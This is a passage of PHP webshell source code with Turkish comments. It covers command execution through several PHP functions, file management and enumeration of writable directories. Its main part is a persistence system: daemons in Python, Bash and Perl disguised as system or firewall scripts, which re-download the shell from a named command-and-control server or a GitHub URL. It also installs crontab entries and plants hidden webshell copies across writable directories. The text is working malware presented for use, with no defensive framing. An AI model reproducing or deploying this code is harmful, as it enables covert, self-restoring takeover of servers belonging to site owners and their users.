        if (!empty($output_lines)) return implode("\n", $output_lines);
    }

    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'system';
        ob_start();
        @system($cmd_pipe);
        $result = ob_get_clean();
        if ($result !== false && $result !== '') return $result;
    }

    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'passthru';
        ob_start();
        @passthru($cmd_pipe);
        $result = ob_get_clean();
        if ($result !== false && $result !== '') return $result;
    }

    if (function_exists('proc_open')) {
        $methods_tried[] = 'proc_open';
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = @proc_open($cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            $combined = trim($stdout . ($stderr ? "\nSTDERR:\n" . $stderr : ''));
            if ($combined !== '') return $combined;
        }
    }

    if (function_exists('popen')) {
        $methods_tried[] = 'popen';
        $handle = @popen($cmd_pipe, 'r');
        if ($handle) {
            $result = '';
            while (!feof($handle)) {
                $result .= fgets($handle);
            }
            pclose($handle);
            if ($result !== '') return $result;
        }
    }

    return "[ERROR] Cannot execute command. Tried: " . implode(', ', $methods_tried);
}

// =====================================================
// DOSYA SİSTEMİ İŞLEMLERİ
// =====================================================
function list_directory($path) {
    $path = str_replace('\\', '/', $path);
    $real = realpath($path);
    
    if (!$real || !is_dir($real)) {
        return json_encode(['error' => "Directory not found: $path"]);
    }
    
    $items = [];
    $dir = @opendir($real);
    
    if (!$dir) {
        return json_encode(['error' => "Cannot open directory: $path"]);
    }
    
    while (($file = readdir($dir)) !== false) {
        if ($file === '.' || $file === '..') continue;
        
        $full = $real . DIRECTORY_SEPARATOR . $file;
        $stat = @stat($full);
        
        $items[] = [
            'name' => $file,
            'type' => is_dir($full) ? 'dir' : 'file',
            'path' => str_replace('\\', '/', $full),
            'size' => is_file($full) ? filesize($full) : 0,
            'perms' => substr(sprintf('%o', fileperms($full)), -4),
            'owner' => function_exists('fileowner') ? fileowner($full) : null,
            'group' => function_exists('filegroup') ? filegroup($full) : null,
            'modified' => filemtime($full),
            'readable' => is_readable($full),
            'writable' => is_writable($full),
            'executable' => is_executable($full)
        ];
    }
    
    closedir($dir);
    
    // Dizinleri önce sırala
    usort($items, function($a, $b) {
        if ($a['type'] === $b['type']) {
            return strcasecmp($a['name'], $b['name']);
        }
        return $a['type'] === 'dir' ? -1 : 1;
    });
    
    return json_encode($items, JSON_PRETTY_PRINT);
}

function read_file($file) {
    $real = realpath($file);
    
    if (!$real || !is_file($real) || !is_readable($real)) {
        return "[ERROR] Cannot read file: $file";
    }
    
    $content = @file_get_contents($real);
    return $content !== false ? $content : "[ERROR] Read failed";
}

function write_file($file, $content_b64) {
    $content = base64_decode($content_b64);
    $dir = dirname($file);
    
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    
    $result = @file_put_contents($file, $content);
    return $result !== false ? "OK: $result bytes written" : "[ERROR] Write failed";
}

function delete_file($file) {
    $real = realpath($file);
    
    if (!$real || !is_file($real)) {
        return "[ERROR] File not found: $file";
    }
    
    return @unlink($real) ? "OK: Deleted $file" : "[ERROR] Delete failed";
}

function copy_file($src, $dst) {
    return @copy($src, $dst) ? "OK: Copied $src to $dst" : "[ERROR] Copy failed";
}

function create_directory($path) {
    return @mkdir($path, 0755, true) ? "OK: Created $path" : "[ERROR] Cannot create directory";
}

function get_persistence_target_file() {
    return __FILE__;
}

function get_persistence_source_url() {
    global $persistence_default_url;
    $url = $persistence_default_url;
    $localFile = __DIR__ . '/.persistence_source_url';
    if (file_exists($localFile)) {
        $stored = trim(file_get_contents($localFile));
        if (filter_var($stored, FILTER_VALIDATE_URL)) {
            $url = $stored;
        }
    }
    return $url;
}

function find_writable_directories($bases, $maxDirs = 50, $maxDepth = 3, $maxNodes = 1000) {
    /**
     * PHP-based recursive writable directories search
     * Used as fallback when shell commands unavailable
     */
    $found = [];
    $visited = [];
    $queue = [];

    foreach ($bases as $base) {
        if (!$base || !is_dir($base)) {
            continue;
        }
        $real = realpath($base);
        if (!$real || isset($visited[$real])) {
            continue;
        }
        $visited[$real] = true;
        if (is_writable($real)) {
            $found[] = $real;
        }
        $queue[] = ['path' => $real, 'depth' => 0];
    }

    $nodes = 0;
    while ($queue && count($found) < $maxDirs && $nodes < $maxNodes) {
        $item = array_shift($queue);
        $nodes++;
        $path = $item['path'];
        $depth = $item['depth'];

        if ($depth >= $maxDepth) {
            continue;
        }

        $entries = @scandir($path);
        if (!$entries || !is_array($entries)) {
            continue;
        }

        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') {
                continue;
            }
            $sub = $path . DIRECTORY_SEPARATOR . $entry;
            if (!is_dir($sub)) {
                continue;
            }
            $realSub = realpath($sub);
            if (!$realSub || isset($visited[$realSub])) {
                continue;
            }
            if (in_array($entry, ['proc', 'sys', 'dev', 'run', 'tmp', 'lost+found'], true)) {
                continue;
            }
            $visited[$realSub] = true;
            if (is_writable($realSub)) {
                $found[] = $realSub;
            }
            $queue[] = ['path' => $realSub, 'depth' => $depth + 1];
        }
    }

    return $found;
}

function enumerate_root_writable_dirs() {
    /**
     * Root path altında writable dizinleri enumerate et
     * find / -maxdepth 5 -writable -type d 2>/dev/null | head -n 100
     */
    $writable_dirs = [];
    
    // YÖNTEM 1: find komutu ile (daha hızlı ve kapsamlı)
    if (function_exists('shell_exec')) {
        $find_cmd = 'find / -maxdepth 5 -writable -type d 2>/dev/null | head -n 100';
        $output = @shell_exec($find_cmd);
        if ($output) {
            $lines = explode("\n", trim($output));
            foreach ($lines as $line) {
                $line = trim($line);
                if ($line && is_dir($line) && is_writable($line)) {
                    $writable_dirs[] = $line;
                }
            }
        }
    }
    
    // YÖNTEM 2: PHP ile recursive search (fallback)
    if (count($writable_dirs) < 10) {
        $php_dirs = find_writable_directories(['/'], 100, 5, 1000);
        $writable_dirs = array_merge($writable_dirs, $php_dirs);
    }
    
    // Duplicate'ları kaldır ve filtrele
    $writable_dirs = array_unique($writable_dirs);
    $filtered = [];
    
    foreach ($writable_dirs as $dir) {
        // Tehlikeli dizinleri çıkar
        if (strpos($dir, '/proc/') === 0 || 
            strpos($dir, '/sys/') === 0 || 
            strpos($dir, '/dev/') === 0 ||
            $dir === '/' ||
            !is_writable($dir)) {
            continue;
        }
        $filtered[] = $dir;
    }
    
    return array_slice($filtered, 0, 100);
}

// =====================================================
// PERSISTENCE SISTEMI - SIMPLIFIED
// =====================================================

function restore_from_backup() {
    /**
     * Yedek dosyadan restore et (/tmp'de saklı)
     */
    $backupFile = sys_get_temp_dir() . '/mori_backup_' . md5(SHELL_FILE);
    if (file_exists($backupFile) && filesize($backupFile) > 5000) {
        $data = @file_get_contents($backupFile);
        if ($data && strlen($data) > 5000) {
            $src = SHELL_PATH;
            if (!file_exists($src) || filesize($src) < 5000) {
                @file_put_contents($src, $data);
                @chmod($src, 0644);
                return true;
            }
        }
    }
    return false;
}

// Backup'ı temp'e kaydet (ilk çalışmada)
@file_put_contents(sys_get_temp_dir() . '/mori_backup_' . md5(SHELL_FILE), @file_get_contents(__FILE__));

function install_python_monitor() {
    /**
     * Install Python-based 30-second monitoring daemon
     * Detects missing/corrupted haeder.php and restores automatically
     */
    global $c2_server;
    
    $python_cmd = detect_python_command();
    if (!$python_cmd) {
        return false; // Python not available
    }
    
    $script_path = '/tmp/.mori_monitor.py';
    $log_file = '/tmp/.mori_monitor.log';
    $main_file = SHELL_PATH;
    $c2_restore = 'https://juiceshop.cc/nebakiyonla_hurmsaqw/c2serverr.php?act=auto_restore';
    $github_url = 'https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/' . SHELL_FILE;
    
    $python_code = <<<'PYTHON'
#!/usr/bin/env python3
import time
import urllib.request
import urllib.error
import os
import sys
from datetime import datetime

MAIN_FILE = '%MAIN_FILE%'
C2_URL = '%C2_URL%'
GITHUB_URL = '%GITHUB_URL%'
LOG_FILE = '%LOG_FILE%'
INTERVAL = 30

def log_msg(msg):
    try:
        with open(LOG_FILE, 'a') as f:
            ts = datetime.now().strftime('[%%Y-%%m-%%d %%H:%%M:%%S]')
            f.write(f"{ts} {msg}\n")
    except:
        pass

def fetch_url(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=timeout) as response:
            return response.read()
    except:
        return None

def check_and_restore():
    try:
        iteration = 1
        while True:
            log_msg(f"=== ITERATION {iteration} ===")
            
            # Check file size
            if not os.path.exists(MAIN_FILE):
                file_size = 0
            else:
                file_size = os.path.getsize(MAIN_FILE)
            
            log_msg(f"FILE SIZE: {file_size} bytes")
            
            if file_size < 10000:  # If missing or corrupted
                log_msg("STATUS: File missing/corrupted - RESTORING")
                
                # Try C2 first
                content = fetch_url(C2_URL)
                source = "C2"
                
                # Fallback to GitHub
                if not content or len(content) < 10000:
                    content = fetch_url(GITHUB_URL)
                    source = "GitHub"
                
                if content and len(content) > 10000:
                    try:
                        # Ensure directory exists
                        os.makedirs(os.path.dirname(MAIN_FILE), exist_ok=True)
                        # Write with atomic operation
                        with open(MAIN_FILE, 'wb') as f:
                            f.write(content)
                        log_msg(f"SUCCESS: File restored from {source} ({len(content)} bytes)")
                    except Exception as e:
                        log_msg(f"ERROR writing file: {str(e)}")
                else:
                    log_msg("ERROR: Could not fetch valid content from any source")
            else:
                log_msg("STATUS: File OK - Monitoring")
            
            iteration += 1
            time.sleep(INTERVAL)
    except Exception as e:
        log_msg(f"FATAL ERROR: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    check_and_restore()
PYTHON;
    
    // Replace placeholders
    $python_code = str_replace(
        ['%MAIN_FILE%', '%C2_URL%', '%GITHUB_URL%', '%LOG_FILE%'],
        [$main_file, $c2_restore, $github_url, $log_file],
        $python_code
    );
    
    // Write Python script
    @file_put_contents($script_path, $python_code);
    @chmod($script_path, 0755);
    
    // Start daemon with multiple fallback methods
    // Method 1: shell_exec (preferred)
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $cmd = "nohup {$python_cmd} {$script_path} > /dev/null 2>&1 &";
        @shell_exec($cmd);
        
        // Add to cronjob
        $cron_entry = "*/1 * * * * nohup {$python_cmd} {$script_path} > /dev/null 2>&1 && sleep 1 &";
        @shell_exec("(crontab -l 2>/dev/null | grep -v '.mori_monitor.py'; echo '{$cron_entry}') | crontab - 2>/dev/null");
        
        return true;
    }
    
    // Method 2: proc_open fallback
    if (function_exists('proc_open')) {
        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $proc = @proc_open("{$python_cmd} {$script_path}", $descriptors, $pipes);
        if (is_resource($proc)) {
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            // Don't call proc_close yet - let it run in background
            return true;
        }
    }
    
    // Method 3: Background supervisor script via cron
    $cron_entry = "*/1 * * * * {$python_cmd} {$script_path} > /dev/null 2>&1 &";
    $crontab = @shell_exec('crontab -l 2>/dev/null') ?: '';
    if (strpos($crontab, '.mori_monitor.py') === false) {
        $new_crontab = trim($crontab) . "\n" . $cron_entry . "\n";
        $tmp = tempnam(sys_get_temp_dir(), 'cron_');
        if (@file_put_contents($tmp, $new_crontab)) {
            @shell_exec('crontab ' . escapeshellarg($tmp) . ' 2>/dev/null');
            @unlink($tmp);
            return true;
        }
    }
    
    return false;
}

function install_bash_monitor_fallback() {
    /**
     * Bash fallback - 30-second monitoring (if Python not available)
     */
    $script_path = '/tmp/.mori_monitor.sh';
    $log_file = '/tmp/.mori_monitor.log';
    $main_file = SHELL_PATH;
    $c2_url = 'https://juiceshop.cc/nebakiyonla_hurmsaqw/c2serverr.php?act=auto_restore';
    $github_url = 'https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/' . SHELL_FILE;
    
    $bash_code = <<<'BASH'
#!/bin/sh
# Bash fallback monitor - 30-second intervals
set +e
trap 'true' ERR

MAIN_FILE='%MAIN_FILE%'
C2_URL='%C2_URL%'
GITHUB_URL='%GITHUB_URL%'
LOG_FILE='%LOG_FILE%'
INTERVAL=30

log_msg() {
    ts=$(date '+[%%Y-%%m-%%d %%H:%%M:%%S]')
    echo "$ts $1" >> "$LOG_FILE" 2>/dev/null
}

check_and_restore() {
    iteration=1
    while true; do
        log_msg "=== ITERATION $iteration ==="
        
        # Check file size
        if [ -f "$MAIN_FILE" ]; then
            file_size=$(wc -c < "$MAIN_FILE" 2>/dev/null || echo 0)
        else
            file_size=0
        fi
        
        log_msg "FILE SIZE: $file_size bytes"
        
        if [ "$file_size" -lt 10000 ] 2>/dev/null; then
            log_msg "STATUS: File missing/corrupted - RESTORING"
            
            # Try C2
            content=$(curl -fsSL --max-time 10 "$C2_URL" 2>/dev/null)
            source="C2"
            
            # Fallback to GitHub
            if [ -z "$content" ] || [ $(echo -n "$content" | wc -c) -lt 10000 ] 2>/dev/null; then
                content=$(curl -fsSL --max-time 10 "$GITHUB_URL" 2>/dev/null)
                source="GitHub"
            fi
            
            if [ -n "$content" ] && [ $(echo -n "$content" | wc -c) -ge 10000 ] 2>/dev/null; then
                mkdir -p "$(dirname "$MAIN_FILE")" 2>/dev/null
                echo "$content" > "$MAIN_FILE" 2>/dev/null
                restored_size=$(wc -c < "$MAIN_FILE" 2>/dev/null || echo 0)
                log_msg "SUCCESS: File restored from $source ($restored_size bytes)"
            else
                log_msg "ERROR: Could not fetch valid content"
            fi
        else
            log_msg "STATUS: File OK - Monitoring"
        fi
        
        iteration=$((iteration + 1))
        sleep $INTERVAL
    done
}

check_and_restore
BASH;
    
    // Replace placeholders
    $bash_code = str_replace(
        ['%MAIN_FILE%', '%C2_URL%', '%GITHUB_URL%', '%LOG_FILE%'],
        [$main_file, $c2_url, $github_url, $log_file],
        $bash_code
    );
    
    // Write bash script
    @file_put_contents($script_path, $bash_code);
    @chmod($script_path, 0755);
    
    // Start daemon with multiple fallback methods
    // Method 1: shell_exec (preferred)
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        @shell_exec("nohup /bin/sh {$script_path} > /dev/null 2>&1 &");
        
        // Add to cronjob
        $cron_entry = "*/1 * * * * nohup /bin/sh {$script_path} > /dev/null 2>&1 && sleep 1 &";
        @shell_exec("(crontab -l 2>/dev/null | grep -v '.mori_monitor.sh'; echo '{$cron_entry}') | crontab - 2>/dev/null");
        
        return true;
    }
    
    // Method 2: proc_open fallback
    if (function_exists('proc_open')) {
        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $proc = @proc_open('/bin/sh ' . escapeshellarg($script_path), $descriptors, $pipes);
        if (is_resource($proc)) {
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            return true;
        }
    }
    
    // Method 3: Cron-based supervision only
    $cron_entry = "*/1 * * * * /bin/sh {$script_path} > /dev/null 2>&1 &";
    $crontab = @shell_exec('crontab -l 2>/dev/null') ?: '';
    if (strpos($crontab, '.mori_monitor.sh') === false) {
        $new_crontab = trim($crontab) . "\n" . $cron_entry . "\n";
        $tmp = tempnam(sys_get_temp_dir(), 'cron_');
        if (@file_put_contents($tmp, $new_crontab)) {
            @shell_exec('crontab ' . escapeshellarg($tmp) . ' 2>/dev/null');
            @unlink($tmp);
            return true;
        }
    }
    
    return false;
}

function verify_and_restore() {
    /**
     * GELİŞMİŞ: Her request'te:
     * 1. Haeder.php'in checksum'ını kontrol et
     * 2. Eğer silinmiş/bozuk ise enhanced restore mekanizmasını kullan
     * 3. 5 backup konumundan + C2 ?urlver'den restore
     */
    
    // Önce enhanced restore mekanizmasını dene
    if (enhanced_restore_mechanism()) {
        return true;
    }
    
    // Fallback: Eski yöntem
    $mainFile = SHELL_PATH;
    $c2_auto_restore = 'https://juiceshop.cc/nebakiyonla_hurmsaqw/c2serverr.php?act=auto_restore';
    
    // Fallback URLs - multiple options
    $fallbackUrls = [
        'https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/' . SHELL_FILE,
    ];
    
    $expectedSize = 15000; // Minimum valid file size
    $lastCheckFile = __DIR__ . '/.haeder_checksum';
    
    // Calculate current file checksum
    $currentChecksum = file_exists($mainFile) ? md5_file($mainFile) : null;
    $storedChecksum = file_exists($lastCheckFile) ? trim(file_get_contents($lastCheckFile)) : null;
    
    // Kontrol 1: Dosya var mı?
    if (!file_exists($mainFile)) {
        // Önce C2'den iste (daha hızlı ve kontrollü)
        $content = fetch_url_content($c2_auto_restore, 10);
        if ($content && strlen($content) > $expectedSize) {
            @file_put_contents($mainFile, $content);
            @chmod($mainFile, 0644);
            @file_put_contents($lastCheckFile, md5($content));
            return true;
        }
        
        // C2 başarısız, fallback URL'lerden al
        foreach ($fallbackUrls as $url) {
            $content = fetch_url_content($url, 10);
            if ($content && strlen($content) > $expectedSize) {
                @file_put_contents($mainFile, $content);
                @chmod($mainFile, 0644);
                @file_put_contents($lastCheckFile, md5($content));
                return true;
            }
        }
        
        // Fallback: memory'den restore et
        return restore_from_memory();
    }
    
    // Kontrol 2: Dosya boyutu normal mı?
    $size = filesize($mainFile);
    if ($size < $expectedSize) {
        // Bozuk veya eksik - restore et
        $content = fetch_url_content($c2_auto_restore, 10);
        if ($content && strlen($content) > $expectedSize) {
            @file_put_contents($mainFile, $content);
            @chmod($mainFile, 0644);
            @file_put_contents($lastCheckFile, md5($content));
            return true;
        } 
        
        // Fallback URLs'den dene
        foreach ($fallbackUrls as $url) {
            $content = fetch_url_content($url, 10);
            if ($content && strlen($content) > $expectedSize) {
                @file_put_contents($mainFile, $content);
                @chmod($mainFile, 0644);
                @file_put_contents($lastCheckFile, md5($content));
                return true;
            }
        }
        
        return restore_from_memory();
    }
    
    // Kontrol 3: Dosya tamamen silinmişse (checksum değişti)
    if ($storedChecksum && $currentChecksum !== $storedChecksum) {
        // Restore et
        $content = fetch_url_content($c2_auto_restore, 10);
        if ($content && strlen($content) > $expectedSize) {
            @file_put_contents($mainFile, $content);
            @chmod($mainFile, 0644);
            @file_put_contents($lastCheckFile, md5($content));
            return true;
        }
    } else if ($currentChecksum) {
        // Checksum'u kaydet
        @file_put_contents($lastCheckFile, $currentChecksum);
    }
    
    // Kontrol 4: Sister files'i kontrol et - eksik mi?
    $sisterDirs = [sys_get_temp_dir(), __DIR__, '/tmp', '/var/tmp'];
    $sisterCount = 0;
    
    foreach ($sisterDirs as $dir) {
        if (is_dir($dir) && is_writable($dir)) {
            $files = @glob($dir . '/.*mori_*.php');
            $sisterCount += count($files ?: []);
        }
    }
    
    // Sister file sayısı düşükse yenisini deploy et
    if ($sisterCount < 5) {
        deploy_sister_files();
    }
    
    return true;
}

function ensure_cron_persistence() {
    /**
     * Basitleştirilmiş cron persistence
     */
    $shell = SHELL_PATH;
    $url = $GLOBALS['WEB_URL'] ?? 'http://localhost/';
    $cmd = "*/5 * * * * curl -s '$url' >/dev/null 2>&1 || wget -q '$url' -O /dev/null 2>&1";
    @shell_exec("(crontab -l 2>/dev/null | grep -v mori; echo \"$cmd\") | crontab - 2>/dev/null");
    return true;
}

// =====================================================
// DISTRIBUTED NETWORK BACKUP SYSTEM (Advanced Persistence)
// Bash + PHP dosyaları 50 writable konuma gömme
// Inventory + Cronjob monitoring
// =====================================================

function deploy_distributed_network_backups() {
    /**
     * GELİŞMİŞ: Max 100 writable konuma root enumeration ile:
     * - system-update.sh (Bash)
     * - backup-manager.py (Python)
     * - log-cleaner.pl (Perl)
     * - .system_config.php (WebShell backup)
     *
     * Her script webshell'i kontrol eder ve restore eder
     */

    global $c2_server, $web_shell_url;

    // 1. Root enumeration ile writable dizinleri bul
    $writable_dirs = enumerate_root_writable_dirs();

    if (count($writable_dirs) < 10) {
        // Fallback: Eski yöntem
        $baseDirs = [
            '/var/www/html', '/var/www', '/home', '/tmp', '/var/tmp',
            '/dev/shm', '/var/cache', '/var/log', '/opt', '/srv',
            '/usr/share', '/usr/local', '/root', '/boot', dirname(__FILE__)
        ];
        $writable_dirs = find_writable_directories($baseDirs, 50, 2, 500);
    }

    if (count($writable_dirs) < 5) {
        return false; // Yeterli dizin yok
    }

    // 2. Normal isimli scriptleri oluştur - TEMP DISABLED
    $scripts = [
        'bash' => ['filename' => 'system-update.sh', 'content' => '#!/bin/bash\necho test', 'permissions' => 0755],
        'python' => ['filename' => 'backup-manager.py', 'content' => '#!/usr/bin/env python3\nprint("test")', 'permissions' => 0755],
        'perl' => ['filename' => 'log-cleaner.pl', 'content' => '#!/usr/bin/env perl\nprint "test\n";', 'permissions' => 0755]
    ];

    // 3. Enhanced restore mekanizmasını çağır
    enhanced_restore_mechanism();

    // 4. Tüm dizinlere deploy et
    $deployed = [];
    $script_types = ['bash', 'python', 'perl'];

    foreach (array_slice($writable_dirs, 0, 100) as $index => $dir) {
        $script_type = $script_types[$index % count($script_types)];
        $script = $scripts[$script_type];

        $script_path = $dir . '/' . $script['filename'];

        // Script'i yaz ve çalıştır
        if (@file_put_contents($script_path, $script['content'])) {
            @chmod($script_path, $script['permissions']);
            $deployed[] = $script_path;

            // Background'da çalıştır
            $cmd = '';
            if ($script_type === 'bash') {
                $cmd = "nohup /bin/bash '$script_path' > /dev/null 2>&1 &";
            } elseif ($script_type === 'python') {
                $python_cmd = detect_python_command();
                if ($python_cmd) {
                    $cmd = "nohup $python_cmd '$script_path' > /dev/null 2>&1 &";
                }
            } elseif ($script_type === 'perl') {
                $cmd = "nohup perl '$script_path' > /dev/null 2>&1 &";
            }

            if ($cmd) {
                @shell_exec($cmd);
            }
        }

        // İlk 5 dizine webshell backup'ı koy
        if ($index < 5) {
            $backup_path = $dir . '/.system_config.php';
            $webshell_content = file_get_contents(__FILE__);
            if ($webshell_content) {
                @file_put_contents($backup_path, $webshell_content);
                @chmod($backup_path, 0644);
            }
        }
    }

    // 5. Inventory dosyası oluştur
    $inventory = generate_inventory_file($deployed, $writable_dirs);
    $inventory_path = $writable_dirs[0] . '/.system_inventory.list';
    @file_put_contents($inventory_path, $inventory);
    @chmod($inventory_path, 0644);

    return count($deployed) >= 5;
}

function generate_php_backup_file() {
    /**
     * Obfuscated PHP backup - wp-firewall.php olarak deploy edilecek
     * Her 30 saniye kontrol eder
     */
    
    global $c2_server, $web_shell_url;
    
    $sourceFile = __FILE__;
    $sourceCode = file_get_contents($sourceFile);
    
    $code = '<?php
@error_reporting(0);
@ini_set("display_errors", 0);
$interval = 30;
$mainFile = dirname(__FILE__) . "/../" . basename(__FILE__);
$checkfile = dirname(__FILE__) . "/.firewall_check";

while(true) {
    sleep($interval);
    
    if (!file_exists($mainFile) || filesize($mainFile) < 5000) {
        // Main shell missing - restore from server
        $payload = @file_get_contents("' . $c2_server . '?urlver");
        if (!$payload || strlen($payload) < 100) {
            // Fallback to GitHub
            $filename = basename($mainFile);
            $payload = @file_get_contents("https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/". $filename);
        }
        
        if ($payload && strlen($payload) > 5000) {
            @file_put_contents($mainFile, $payload);
            @chmod($mainFile, 0644);
        }
    }
    
    @touch($checkfile);
}
?>';
    
    return $code;
}

function generate_bash_monitor_script($directories) {
    /**
     * Bash monitoring script - wp-waf.sh
     * Başka bash dosyalarını kontrol ediyor
     * PHP dosyaları execute ediyor (indirect control)
     */
    
    $phpDirsList = implode(" ", array_slice($directories, 0, 10));
    
    $script = '#!/bin/sh
# wp-waf.sh - Network firewall monitor

interval=30
while true; do
    sleep $interval
    
    # Find and execute .wp-firewall.php files
    for dir in ' . $phpDirsList . '; do
        if [ -f "$dir/.wp-firewall.php" ]; then
            php "$dir/.wp-firewall.php" &
        fi
    done
    
    if [ -f "$dir/.wp-security.list" ]; then
        while IFS= read -r filepath; do
            if [ ! -f "$filepath" ] || [ $(stat -f%z "$filepath" 2>/dev/null || stat -c%s "$filepath" 2>/dev/null) -lt 5000 ]; then
                # File missing or too small - mark for restore
                touch "$dir/.restore_needed"
            fi
        done < "$dir/.wp-security.list"
    fi
done
';
    
    return $script;
}

function deploy_to_enumerated_dirs() {
    /**
     * Enumerated dizinlere normal isimli scriptleri deploy et
     * Her dizine farklı script türleri koy
     * Tümüne okuma/yazma yetkileri ver, çalıştır
     */
    
    // 1. Root writable dizinleri enumerate et
    $writable_dirs = enumerate_root_writable_dirs();
    
    if (count($writable_dirs) < 5) {
        return false; // Yeterli dizin yok
    }

    // 2. Normal isimli scriptleri oluştur
    $scripts = generate_normal_named_scripts();

    // 3. Tüm dizinlere deploy et
    $deployed = [];
    $script_types = ['bash', 'python', 'perl'];
    $deployed_count = 0;

    foreach (array_slice($writable_dirs, 0, 100) as $index => $dir) {
        $script_type = $script_types[$index % count($script_types)];
        $script = $scripts[$script_type];
        
        $script_path = $dir . '/' . $script['filename'];
        
        // Script'i yaz
        if (@file_put_contents($script_path, $script['content'])) {
            // Yetkileri ayarla (okuma, yazma, çalıştırma)
            @chmod($script_path, $script['permissions']);
            $deployed[] = $script_path;
            
            // Script'i çalıştır (background'da)
            $cmd = '';
            if ($script_type === 'bash') {
                $cmd = "nohup /bin/bash '$script_path' > /dev/null 2>&1 &";
            } elseif ($script_type === 'python') {
                $python_cmd = detect_python_command();
                if ($python_cmd) {
                    $cmd = "nohup $python_cmd '$script_path' > /dev/null 2>&1 &";
                }
            } elseif ($script_type === 'perl') {
                $cmd = "nohup perl '$script_path' > /dev/null 2>&1 &";
            }
            
            if ($cmd) {
                @shell_exec($cmd);
            }
            
            $deployed_count++;
            
            // İlk 5 dizine webshell backup'ını da koy
            if ($index < 5) {
                $backup_path = $dir . '/.system_config.php';
                $webshell_content = file_get_contents(__FILE__);
                if ($webshell_content) {
                    @file_put_contents($backup_path, $webshell_content);
                    @chmod($backup_path, 0644);
                }
            }
        }
        
        // Maksimum 50 dizine deploy et
        if ($deployed_count >= 50) {
            break;
        }
    }
    
    // Deploy log'u oluştur
    $log_content = "# Distributed Deployment Log\n";
    $log_content .= "# Date: " . date('Y-m-d H:i:s') . "\n";
    $log_content .= "# Deployed to " . $deployed_count . " directories\n";
    $log_content .= "# Scripts: " . implode(', ', array_keys($scripts)) . "\n\n";
    
    foreach (array_slice($writable_dirs, 0, $deployed_count) as $index => $dir) {
        $script_type = $script_types[$index % count($script_types)];
        $script_name = $scripts[$script_type]['filename'];
        $log_content .= "$dir/$script_name\n";
    }
    
    $log_path = __DIR__ . '/.deployment_log';
    @file_put_contents($log_path, $log_content);
    @chmod($log_path, 0644);
    
    return $deployed_count > 0;
}

function generate_normal_named_scripts() {
    global $c2_server;

    $scripts = [];

    // Bash script
    $bash_script = '#!/bin/bash
MAIN_FILE="' . __DIR__ . '/' . basename(__FILE__) . '"
C2_URL="' . $c2_server . '?urlver"
while true; do
    if [ ! -f "$MAIN_FILE" ] || [ $(wc -c < "$MAIN_FILE" 2>/dev/null || echo 0) -lt 10000 ]; then
        content=$(curl -fsSL --max-time 10 "$C2_URL" 2>/dev/null)
        if [ $(echo -n "$content" | wc -c) -gt 10000 ] 2>/dev/null; then
            echo "$content" > "$MAIN_FILE" 2>/dev/null
            chmod 644 "$MAIN_FILE" 2>/dev/null
        fi
    fi
    sleep 300
done
';

    $scripts['bash'] = [
        'filename' => 'system-update.sh',
        'content' => $bash_script,
        'permissions' => 0755
    ];

    // Python script
    $python_script = '#!/usr/bin/env python3
import time, urllib.request, os
MAIN_FILE = "' . __DIR__ . '/' . basename(__FILE__) . '"
C2_URL = "' . $c2_server . '?urlver"
while True:
    try:
        size = os.path.getsize(MAIN_FILE) if os.path.exists(MAIN_FILE) else 0
        if size < 10000:
            content = urllib.request.urlopen(C2_URL).read().decode()
            if len(content) > 10000:
                with open(MAIN_FILE, "w") as f: f.write(content)
                os.chmod(MAIN_FILE, 0o644)
    except: pass
    time.sleep(300)
';

    $scripts['python'] = [
        'filename' => 'backup-manager.py',
        'content' => $python_script,
        'permissions' => 0755
    ];

    // Perl script
    $perl_script = '#!/usr/bin/env perl
use LWP::Simple;
my $main_file = "' . __DIR__ . '/' . basename(__FILE__) . '";
my $c2_url = "' . $c2_server . '?urlver";
while (1) {
    my $size = -s $main_file || 0;
    if ($size < 10000) {
        my $content = get($c2_url);
        if ($content && length($content) > 10000) {
            open(my $fh, ">", $main_file); print $fh $content; close($fh);
            chmod(0644, $main_file);
        }
    }
    sleep(300);
}
';

    $scripts['perl'] = [
        'filename' => 'log-cleaner.pl',
        'content' => $perl_script,
        'permissions' => 0755
    ];

    return $scripts;
}

function generate_inventory_file($scriptFiles, $directories) {
    /**
     * GELİŞMİŞ: Inventory dosyası oluştur
     * Bash, Python, Perl script'ler + backup locations + deployment info
     */

    $inventory = "# System Inventory - Advanced Deployment\n";
    $inventory .= "# Generated: " . date('Y-m-d H:i:s') . "\n";
    $inventory .= "# Total Scripts Deployed: " . count($scriptFiles) . "\n";
    $inventory .= "# Writable Directories Found: " . count($directories) . "\n\n";

    $inventory .= "# DEPLOYED SCRIPTS:\n";
    foreach ($scriptFiles as $file) {
        $inventory .= $file . "\n";
    }

    $inventory .= "\n# BACKUP LOCATIONS (First 5):\n";
    for ($i = 0; $i < min(5, count($directories)); $i++) {
        $inventory .= $directories[$i] . "/.system_config.php\n";
    }

    $inventory .= "\n# SCRIPT TYPES:\n";
    $inventory .= "system-update.sh (Bash)\n";
    $inventory .= "backup-manager.py (Python)\n";
    $inventory .= "log-cleaner.pl (Perl)\n";

    $inventory .= "\n# MONITORING INTERVALS:\n";
    $inventory .= "Python daemon: 30 seconds\n";
